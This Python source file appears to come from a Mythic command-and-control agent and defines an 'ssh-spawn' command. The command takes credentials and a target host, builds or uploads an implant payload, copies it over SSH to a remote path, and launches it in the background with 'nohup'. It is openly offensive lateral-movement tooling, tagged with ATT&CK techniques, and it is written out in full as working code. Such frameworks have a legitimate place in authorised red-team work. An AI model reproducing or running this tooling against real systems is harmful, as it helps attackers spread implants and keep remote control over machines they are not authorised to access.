import asyncio
import base64
import json
import sys

from mythic_container.MythicCommandBase import (
    TaskArguments,
    CommandBase,
    CommandAttributes,
    CommandParameter,
    ParameterType,
    ParameterGroupInfo,
    SupportedOS,
    MythicTask,
    PTTaskMessageAllData,
    PTTaskProcessResponseMessageResponse,
)
from mythic_container.MythicGoRPC import (
    SendMythicRPCPayloadCreateFromUUID,
    MythicRPCPayloadCreateFromUUIDMessage,
    SendMythicRPCPayloadGetContent,
    MythicRPCPayloadGetContentMessage,
    SendMythicRPCFileCreate,
    MythicRPCFileCreateMessage,
)


class SshSpawnArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="credentials",
                type=ParameterType.Credential_JSON,
                description="Credentials to use",
                display_name="Credentials to use",
                parameter_group_info=[
                    ParameterGroupInfo(
                        group_name="Mythic Payload",
                        ui_position=1,
                        required=True,
                    ),
                    ParameterGroupInfo(
                        group_name="Upload Payload",
                        ui_position=1,
                        required=True,
                    ),
                ],
            ),
            CommandParameter(
                name="host",
                type=ParameterType.String,
                description="Hostname or IP address of remote machine",
                display_name="Hostname or IP address of remote machine",
                parameter_group_info=[
                    ParameterGroupInfo(
                        group_name="Mythic Payload",
                        ui_position=3,
                        required=True,
                    ),
                    ParameterGroupInfo(
                        group_name="Upload Payload",
                        ui_position=3,
                        required=True,
                    ),
                ],
            ),
            CommandParameter(
                name="port",
                type=ParameterType.Number,
                description="Port number for ssh connection",
                display_name="Port number for ssh connection",
                default_value=22,
                parameter_group_info=[
                    ParameterGroupInfo(
                        group_name="Mythic Payload",
                        ui_position=4,
                        required=True,
                    ),
                    ParameterGroupInfo(
                        group_name="Upload Payload",
                        ui_position=4,
                        required=True,
                    ),
                ],
            ),
            CommandParameter(
                name="agent",
                type=ParameterType.Boolean,
                description="Use the ssh agent for auth",
                display_name="Use the ssh agent for auth",
                default_value=False,
                parameter_group_info=[
                    ParameterGroupInfo(
                        group_name="Mythic Payload",
                        ui_position=2,
                        required=True,
                    ),
                    ParameterGroupInfo(
                        group_name="Upload Payload",
                        ui_position=2,
                        required=True,
                    ),
                ],
            ),
            CommandParameter(
                name="payload",
                type=ParameterType.Payload,
                description="Mythic payload to spawn on the system",
                display_name="Mythic payload to spawn on the system",
                parameter_group_info=[
                    ParameterGroupInfo(
                        group_name="Mythic Payload",
                        ui_position=5,
                        required=True,
                    ),
                ],
            ),
            CommandParameter(
                name="upload",
                type=ParameterType.File,
                description="Payload to upload and spawn on the system",
                display_name="Payload to upload and spawn on the system",
                parameter_group_info=[
                    ParameterGroupInfo(
                        ui_position=5,
                        required=True,
                        group_name="Upload Payload",
                    ),
                ],
            ),
            CommandParameter(
                name="path",
                type=ParameterType.String,
                description="Remote path to upload the agent to",
                display_name="Remote path to upload the agent to",
                parameter_group_info=[
                    ParameterGroupInfo(
                        group_name="Mythic Payload",
                        ui_position=6,
                        required=True,
                    ),
                    ParameterGroupInfo(
                        group_name="Upload Payload",
                        ui_position=6,
                        required=True,
                    ),
                ],
            ),
            CommandParameter(
                name="exec",
                type=ParameterType.String,
                description=(
                    "Command used to run the payload "
                    "({path} is the path to the payload on the remote system)"
                ),
                display_name=(
                    "Command used to run the payload "
                    "({path} is the path to the payload on the remote system)"
                ),
                default_value="nohup {path} >/dev/null 2>&1 &",
                parameter_group_info=[
                    ParameterGroupInfo(
                        group_name="Mythic Payload",
                        ui_position=7,
                        required=True,
                    ),
                    ParameterGroupInfo(
                        group_name="Upload Payload",
                        ui_position=7,
                        required=True,
                    ),
                ],
            ),
        ]

    async def parse_arguments(self):
        self.load_args_from_json_string(self.command_line)

    async def parse_dictionary(self, dictionary_arguments: dict):
        self.load_args_from_dictionary(dictionary_arguments)


class SshSpawnCommand(CommandBase):
    cmd = "ssh-spawn"
    needs_admin = False
    help_cmd = "ssh-spawn"
    description = (
        "Spawn an already existing payload or "
        "upload a new payload and spawn it on a system using SSH"
    )
    version = 1
    is_upload_file = True
    author = "@M_alphaaa"
    attackmapping = ["T1021.004", "T1055"]
    argument_class = SshSpawnArguments
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Linux, SupportedOS.Windows],
    )

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        exec_cmd = task.args.get_arg("exec")
        path = task.args.get_arg("path")
        exec_cmd = exec_cmd.replace("{path}", path)
        task.args.set_arg("exec", exec_cmd)

        if uuid := task.args.get_arg("payload"):
            return await self.payload_tasking(task, uuid)

        upload_file = task.args.get_arg("upload")
        return await self.file_upload_tasking(task, upload_file)

    async def process_response(
        self, task: PTTaskMessageAllData, response: str
    ) -> PTTaskProcessResponseMessageResponse:
        pass

    async def payload_tasking(self, task: MythicTask, payload_uuid) -> MythicTask:
        task.set_stdout("Sending build task...")

        gen_resp = await SendMythicRPCPayloadCreateFromUUID(
            MythicRPCPayloadCreateFromUUIDMessage(
                task.id,
                PayloadUUID=payload_uuid,
                RemoteHost=task.args.get_arg("host"),
                NewDescription=f"{task.operator}'s spawned session from task {str(task.id)}",
            )
        )

        if gen_resp:
            task.set_stdout("Building payload...")
            while True:
                resp = await SendMythicRPCPayloadGetContent(
                    MythicRPCPayloadGetContentMessage(
                        PayloadUUID=gen_resp.response["uuid"],
                    )
                )

                if resp:
                    if resp.response["build_phase"] == "success":
                        task.args.add_arg("payload", resp.response["file"]["agent_file_id"])
                        break

                    if resp.response["build_phase"] == "error":
                        raise Exception(
                            f"Failed to build new payload: {resp.response['error_message']}"
                        )

                    if resp.response["build_phase"] == "building":
                        await asyncio.sleep(2)
                    else:
                        raise Exception(resp.response["build_phase"])
                else:
                    raise Exception(resp.response["error_message"])
        else:
            raise Exception("Failed to start build process")
        task.set_stdout("Built payload")

        return task

    async def file_upload_tasking(self, task: MythicTask, file) -> MythicTask:
        try:
            original_file_name = json.loads(task.original_params)["upload"]
            file_resp = await SendMythicRPCFileCreate(
                MythicRPCFileCreateMessage(
                    task.id,
                    FileContents=base64.b64encode(file.encode()).decode(),
                    Filename=original_file_name,
                    DeleteAfterFetch=True,
                )
            )

            if file_resp:
                task.args.add_arg("payload", file_resp.response["agent_file_id"])
            else:
                raise Exception("Error from Mythic: " + str(file_resp.error))
        except Exception as e:
            raise Exception(f"Error from Mythic: {str(sys.exc_info()[-1].tb_lineno)} {str(e)}")

        return task
